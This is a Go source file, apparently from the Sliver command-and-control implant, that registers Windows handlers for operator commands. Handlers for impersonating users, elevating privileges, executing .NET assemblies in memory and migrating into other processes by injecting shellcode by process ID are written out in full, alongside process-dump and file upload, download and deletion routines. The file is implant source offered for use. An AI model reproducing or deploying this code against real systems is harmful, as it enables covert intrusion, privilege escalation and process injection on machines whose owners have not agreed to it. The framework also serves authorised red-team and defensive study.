package handlers

import (
	// {{if .Debug}}
	"log"
	// {{else}}{{end}}

	pb "sliver/protobuf/sliver"
	"sliver/sliver/priv"
	"sliver/sliver/taskrunner"

	"github.com/golang/protobuf/proto"
)

var (
	windowsHandlers = map[uint32]RPCHandler{
		// Windows Only
		pb.MsgTask:               taskHandler,
		pb.MsgRemoteTask:         remoteTaskHandler,
		pb.MsgProcessDumpReq:     dumpHandler,
		pb.MsgImpersonateReq:     impersonateHandler,
		pb.MsgElevateReq:         elevateHandler,
		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
		pb.MsgMigrateReq:         migrateHandler,

		// Generic
		pb.MsgPsReq: psHandler,
		pb.MsgPing:  pingHandler,
		pb.MsgLsReq:       dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,
	}
)

func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &pb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	out, err := priv.RunProcessAsUser(impersonateReq.Username, impersonateReq.Process, impersonateReq.Args)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	impersonate := &pb.Impersonate{
		Output: out,
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func elevateHandler(data []byte, resp RPCResponse) {
	elevateReq := &pb.ElevateReq{}
	err := proto.Unmarshal(data, elevateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	elevate := &pb.Elevate{}
	err = priv.Elevate()
	if err != nil {
		elevate.Err = err.Error()
		elevate.Success = false
	} else {
		elevate.Success = true
		elevate.Err = ""
	}
	data, err = proto.Marshal(elevate)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &pb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Arguments, execReq.Timeout)
	strErr := ""
	if err != nil {
		strErr = err.Error()
	}
	execResp := &pb.ExecuteAssembly{
		Output: output,
		Error:  strErr,
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)

}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &pb.MigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode)
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &pb.Migrate{
		Success: true,
		Err:     "",
	}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Err = err.Error()
		// {{if .Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}
